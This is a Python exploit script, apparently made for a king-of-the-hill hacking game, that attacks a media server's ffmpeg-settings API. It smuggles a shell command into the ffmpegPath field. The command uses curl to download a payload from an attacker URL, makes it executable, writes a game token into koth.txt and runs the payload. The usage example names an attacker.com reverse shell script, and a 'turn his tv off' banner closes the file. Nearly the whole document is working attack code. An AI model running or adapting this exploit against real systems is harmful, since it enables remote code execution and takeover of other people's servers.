#!/usr/bin/env python3

import requests
import json
import sys
import time

def exploit(target_ip, port, payload_url):
    base_url = f"http://{target_ip}:{port}"
    ffmpeg_settings_url = f"{base_url}/api/ffmpeg-settings"
    version_url = f"{base_url}/#!/version"
    print(f"[+] turning tv off at {base_url}")
    try:
        settings_response = requests.get(ffmpeg_settings_url)
        settings = settings_response.json()
        settings_id = settings.get("_id")
        
        if not settings_id:
            print("[-] failed to get tv id")
            print(f"[-] tv response: {settings}")
            return False
            
        print(f"[+] found tv id: {settings_id}")
    except Exception as e:
        print(f"[-] error finding tv signal: {e}")
        return False
    
    payload = {
        "configVersion": 5,
        "ffmpegPath": f"\";curl {payload_url} -o payload.sh && chmod +x ./payload.sh && touch /home/$USER/koth.txt && echo 'cd1a5cf3-70b4-403b-a60e-cd883667dfa2' > /home/$USER/koth.txt && ./payload.sh\"",
        "threads": 4,
        "concatMuxDelay": "0",
        "logFfmpeg": False,
        "enableFFMPEGTranscoding": True,
        "audioVolumePercent": 100,
        "videoEncoder": "mpeg2video",
        "audioEncoder": "ac3",
        "targetResolution": "1920x1080",
        "videoBitrate": 2000,
        "videoBufSize": 2000,
        "audioBitrate": 192,
        "audioBufSize": 50,
        "audioSampleRate": 48,
        "audioChannels": 2,
        "errorScreen": "pic",
        "errorAudio": "silent",
        "normalizeVideoCodec": True,
        "normalizeAudioCodec": True,
        "normalizeResolution": True,
        "normalizeAudio": True,
        "maxFPS": 60,
        "scalingAlgorithm": "bicubic",
        "deinterlaceFilter": "none",
        "_id": settings_id
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json; charset=UTF-8",
        "Origin": base_url,
        "Referer": base_url,
        "Connection": "keep-alive"
    }
    
    try:
        print("[+] posioning tv signal...")
        update_response = requests.put(ffmpeg_settings_url, json=payload, headers=headers)
        
        if update_response.status_code == 200:
            print("[+] successfully poisoned tv signal")
            print(f"[+] Response: {update_response.text}")
        else:
            print(f"[-] failed to poison tv signal. Status code: {update_response.status_code}")
            print(f"[-] Response: {update_response.text}")
            return False
    except Exception as e:
        print(f"[-] error intercepting signal: {e}")
        return False
    
    try:
        print("[+] broadcasting rouge tv signal...")
        
        api_version_url = f"{base_url}/api/version"
        print(f"[+] Trying API version endpoint: {api_version_url}")
        api_response = requests.get(api_version_url)
        print(f"[+] API response: {api_response.text}")
        
        print(f"[+] Trying UI version endpoint: {version_url}")
        browser_headers = headers.copy()
        browser_headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
        ui_response = requests.get(version_url, headers=browser_headers)
        return True
    except Exception as e:
        print(f"[-] error turning tv off: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <target_ip> <port> <payload_url>")
        print(f"Example: {sys.argv[0]} 10.0.104.215 8000 http://attacker.com/revshell.sh")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    port = sys.argv[2]
    payload_url = sys.argv[3]

    print("""
    ::::::::::::::::::::::::::::::::::::::::::::::+#%%%%%%%%%%%%%%%*=::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::-+#%%%%%%%%%%%%%%%%%%%%%%%%%#+-::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::.:::-+%%%%%%%%%%%%%#++**++%%%%%%%%%%%%%%%+-::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::-*%%%%%%%%%%%%%%%*.:#%%:+%%%%%%%%%%%%%%%%+:::::::::::::::::::::::::::::::::::::::
..........::::::::.:::::::::::::.-#%%%%%%%%%%%%%%%%*..:+===%%%%%%%%%%%%%%%%%#::::::::::::::::::::.........:::......
......:........:::.:::...:::::::=%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#-::::................................
.............................::=%%%%%%%%%@@@%%%%%%%%@@@@@@@%%%%%%%%@@%%%%%%%%%#:...................................
............................::-%%%%%%%@@%%@@@@%%%###*++++++***##%@@@@@@@%@%%%%%%::.................................
.............................:#%%%%@@@@@%#*+=--------------------==+*#%@@%@@%%%%*:.................................
.............................-%%%@@@@%*++==-----::::::::::::::-----===+*#%@@@@%%#-.................................
.............................*%@@@@#++==++++==-----::::::::-----=++*+++==+*%@@@%%=:................................
............................:%@@@%**##%#%%%%%%##*+----------=*##%%%%%%%#%#**#@@@%+.................................
............................-%@@%+*##***##%%%%%%%#++===++==*#%%%%%%%#**++**#+*@@%*:................................
............................-@@%+*#**+++++**#%%%%%##*****###%%%%%##**++++**#*+*@@%:................................
............................-@%*+*####%@%%%%@%@@@@%#*++++#%%@@@@%@%%#%%@%%###++*@%:................................
............................-@#++##%@@#=+*+*+*@%@@%*=-:-=*#%@@%%*+#*%#++%@%##*++%#:................................
.......................:+++-+@#**#%%%#*+#%%%#******+::::-=+***+***#%%#***#%%##*+%%-=+*+:...........................
.......................=@@@%#%#***+++*#######*+=====::::--=====+*#%%#####+=++***%%%%@@%=...........................
.......................:%@@%#%#*++=----====-----===-:::::--===------=------==+**%##%@@#:...........................
........................-%%##%#**=-:::::::::--=++=-::::::::-=+++=--::::::::--+*#%%#%%*.............................
.........................:*##%#*+==--:---==+##=-=-::::::::::-=-=##*+==------==+*%%#%+:.............................
..........................:***#****+++++*#%%%**++**+++++++**#*+***%%%#*+++++***##*#+:..............................
...........................-#######***##%%%#**#%@@@%######%@@@%#***#@%%##**#####*#*:...............................
...........................-**#%%%###%%%%%#****##%@@@@@@@@@@%###****#%%%%%###%%%#*#................................
...........................:+-*%@%%%%%%@#*+**#%%%@@@%@@@%#%%%%%%##***#%%%%%%%@%%+=-:...............................
..........................::-#%@@%%%%%%%%%@%%%@%%%#***#**++#%%%%%%%%%@%%#%%%@@@%%+:................................
.............................-%@@@@@%%#%@@@@%%%%%%%%%%%%%%%%%%%%%@@@@@@%#%%@@@@@*::................................
............................::-#@@@@@%%%@@@@@%*++=*++*%#+=++=+=*%@@@@@@%%%@@@@@+:.:................................
..............................:=@@@@@@%%%@%#*#*#+-:-+=--:::--+*##*#%@@%%%@@@@@*::..................................
...........................:::-*%@@@@@%%@%%##*+**##%***#*+%%%*****##%@%%@@@@@@%=:::................................
..........................:::*%%@@@@@@@@@@%###***+=---------+#**####@@@@@@@@@@%%@+:::.::...........................
.......::......::::::.:::=*#%@%%%@@@@@@@@@@%#########****##########%@@@@@@@@@%%%@@%#*=:::::::...........::::.......
...............::::-==*%%#%@@%%%%@@@@@@@@@@%####%%%%%%%%%%%%%%####%@@@@@@@@@@%%@%%@%#%@%*+=-::.....................
......:::::::-*%%%%%%%%%@@@@@@@%@@%@@@@@@@@@%###%%%%@@@@@%%%%%####%@@@@@@@@%%@@@@@@@@@@%%%%%%%%%#-::::::...........
:::::-=++*#%%%%%%@@@%@@@@@@@@@@@@%%@@@@@@@@@%#####%%@@@@%%%%#####%@@@@@@@@@@%@@@@@@@@@%@@@%@@@%%%%%%#*+=--::::.....
-+*#%%%%%%%%%%%%%%%%%@@@@@@@@@@@%%@@@%@@@@@@@%#***********++*+*#%%@@@@@@%%@@@%@@@@@@@@@@@@%%%%%%%%%%%%%%%%%#*+=::::
%%%%%%%%%%%%%%%%#%%%%%@@@@@@@@@@%%@@@##%@@@@@@%%##***+++++**##%%@@@@@@%##%@@@%%@@@@@@@@@@%%%%##%%%%%%%%%%%%%%%%%%%#
%%%%%%%%%%%%%###%%%@%%%@@@@@@@@%#@@@@%#%@@@@@@@@@%%%%%%%%%%@%@@@@@@@@@@##@@@@%%%@@@@@@@@%%%@%%%###%%%%%%%%%%%%%%%%%
%%%%%%%%%%%#%%%%%%%%%%%@@@@@@@%%%@@@@@%%%@@@@@@@@@@@%@@@@@@@@@@@@@@@@@%#%@@@@@%%@@@@@@@@%%@%%%%%%#%%#%%%%%%%%%%@%%%
%%%%###%%###%%%%%%%@@@%%%@@@@@%%@@@@@@%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%@@@@@%#%@@@@@%%%@@@%%%%%%%####%###%%%%%%%%
%%%#########%#%%%%%%@@@%%@@@@%#%@@@@%*%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%#*@@@@@#%%@@@%%@@@@%%%%%%###########%%%#%%%
#****#**#**%#%%%%%%%@@@@%%%%%##%@@@@%*+*%#%%%%%%@@@@@@@@@@@@@%%%%%%%#%#==#%@@@@%#%%%%%@@@@@%%%%%%%#%**#*##****####%
%++*+++**#%#%%%%%%%%%@@@@%%%###@@@@%%*=:-+##%%%@@@@@@@@@@@@@@@%%%%###=:-*#%@@@@%*#%%%%@@@@%%%%%%%%%#%#***++**+#%##*
#**++=++*#%@@%%%%%%%%@@@@@%###%@@@@%*++-::-=*#%%%%%@@@%%%%%%%%%%#*=-::-+++#@@@@@%##%%@@@@@%%%%%%%%@@##*++==+**#@%%#
##*++**#%%%@@%%%%%%%%%@@@@%#*#@@@@%#*+=-:::---==+#%%%%%%%%%%#+=----:::-==+*%@@@@@#*#%@@@%%%%%%%%%%@@%%%#**++###%%%@
##*+++*%%%%@@%##%%%%%%@@@@%**%@@@@%#*==-::::----------------------:::::===*%@@@@@#*#%@@@%%%%%%%##%%@%%%%#+++**#%%@@
#++++##%%%%@%###%%%%%%%@@@%##%@@@@%++*=-:::::::::------------::::::::::-=*+#%@@@%###%@@@%%%%%%###%%@%%%%##++++#%%@@
#*++*%%%%%%@%##%%%%%%%@@@%#*#%@@@@%*==+*-:::::::::::--::::::::::::::::=*=-=%%@@@%%##%%@@%%%%%%%%##%@%%%%%%#++*#*%@@
#*+#%%%%#%%%%%%%%%%%@@@@@@@@@@@@@@@#=--=+-:::::::::-----:::::::::::::=+---+@@@@@@@@@@@@@@@@%@%%%%%%%%%#%%%##=+*#%@@
""")
    print("turn his tv off")
    print("================")
    
    success = exploit(target_ip, port, payload_url)
